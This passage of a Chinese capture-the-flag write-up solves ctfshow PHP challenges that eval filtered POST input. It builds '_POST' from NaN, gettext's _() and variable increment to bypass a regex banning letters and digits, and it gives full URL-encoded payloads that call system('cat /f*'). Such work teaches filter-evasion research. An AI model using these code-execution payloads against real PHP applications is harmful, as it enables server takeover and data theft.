## 二


首先，我们可以看到过滤了很多东西  "/[a-zA-Z0-9@#%^&*:{}\-\"|`~\\\\]/"我们可以看看有什么没有过滤掉的

```php
<?php
for ($i=32;$i<127;$i++){
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",chr($i))){
            echo chr($i)." ";
        }

?>
# ! $ ' ( ) + , . / ; = [ ] _
```

可知有! $ ' ( ) + , . / ; = [ ] _ 未被过滤，运用的是一种变量自增的方法来构造payload当变量赋值为[]时候，echo出来的是Array，当变量为[]._时就是Array_。然后echo出来就是A

![](http://xendria.icu/wp-content/uploads/2025/07/9b5f5307-dd03-4451-9ff7-ba12084e2565.png)

那这个时候就有朋友要问了，为什么一定要[]._拼接呢？这是因为[]只是创造了一个空数组，由于数组为空，该元素不存在 → 返回 null。而[]._则是Array拼接上_成为字符串才能用$_[0]把A输出，0的话可以用条件判断的方式来替代。然后后续的步骤就是运用自增和拼接来创造了

```
$_=[].'';//Array
$_=$_[''=='$'];//[''=='$']为假，所以等价于[0],所以就是A
$____='_';//_
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//P
$____.=$__;//_P
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//O
$____.=$__;//_PO
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//S
$____.=$__;//_POS
$__=$_;//A
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//T
```

$ ( ) + , . / 0 1 ; = [ ] _   很明显的多了几个没有被ban的虽然多了几个可用的字符但是对于长度的限制导致我们好像不能用上一个来整了(太长了)无处可寻翻了翻官方wp这边的思路是运用(0/0)和(1/0)来构造float中的NAN和INF来进行一个省略自增的数量，构造的话还是差不多

```
$_=(0/0)._;     //NaN_
$_=$_[0];       //N
$__=++$_;       //$__=O
$__=++$_.$__;   //$__=PO
$_++;$_++;      //Q、R
$__=$__.++$_;   //$__=POS
$__=$__.++$_;   //$__=POST
$_=_.$__;       //$_=_POST
$$_[0]($$_[1]); //$_POST[0]($_POST[1]);
```

```
依旧是附上payload:ctf_show=%24_%3D(0%2F0)._%3B%24_%3D%24_%5B0%5D%3B%24__%3D%2B%2B%24_%3B%24__%3D%2B%2B%24_.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24__.%2B%2B%24_%3B%24__%3D%24__.%2B%2B%24_%3B%24_%3D_.%24__%3B%24%24_%5B0%5D(%24%24_%5B1%5D)%3B&0=system&1=cat /f*
```

没被ban的有这几个$ ( ) + , . / 0 ; = [ ] _然后就是长度限制变成84了，然后就是尝试了

```
我尝试依靠上一题的基础来进行这一题的编写
$_=(0/0)._;$_=$_[0];$__=++$_;$__=_.++$_.$__;++$_;++$_;$__.=++$_.++$_;$$__[0]($$__[_]);
点了一下86，超出了84的限制。。。
```

那我们该从哪里优化呢，主播想不出来了，然后看到官方wp中的`(_/_._)[0];`也是等于N的，真是优雅，利用(_/_._)为0的结果来直接构造出N，那么我们的payload也就能出来了

```
ctf_show=$_=(_/_._)[0];;$__=++$_;$__=_.++$_.$__;++$_;++$_;$__.=++$_.++$_;$$__[0]($$__[_]);&0=system&_=cat /f*    依旧与上题一样在hackbar要先编码一次
```

## 五

也是终于最后一题了，话不多说上代码

```php
<?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 73) {
        if (!preg_match("/[a-zA-Z0-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?>
```

诶，长度限制变成了73，然后只剩下了$ ( ) + , . / ; = [ ] _这些可用，0居然也不能用了诶。那怎么办呢？这局应该就是这个phpinfo()该起作用的时候了官方wp说**这里观察到phpinfo安装了一个扩展gettext，该扩展支持函数`_()` ,相当于`gettext()`，直接转化为字符串。另外，其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符（现象是这样但是实际机制需要看php源码）**就是说可用用_()就等于gettext()我们可用_(_/_)[0]来构造N

```
然后后面就是正常的构造，直接贴上官方wp了
$a=_(a/a)[a];//相当于gettext(0/0)[0],得到N
$_=++$a;//O
$_=_.++$a.$_;//_PO
$a++;$a++;//R
$_.=++$a.++$a;//_POST
$$_[a]($$_[_]);//$_POST[a]($_POST[_])
```

然后就是把$a替换为不可见字符变量

```
ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&_=system&%ff=cat /f*
```
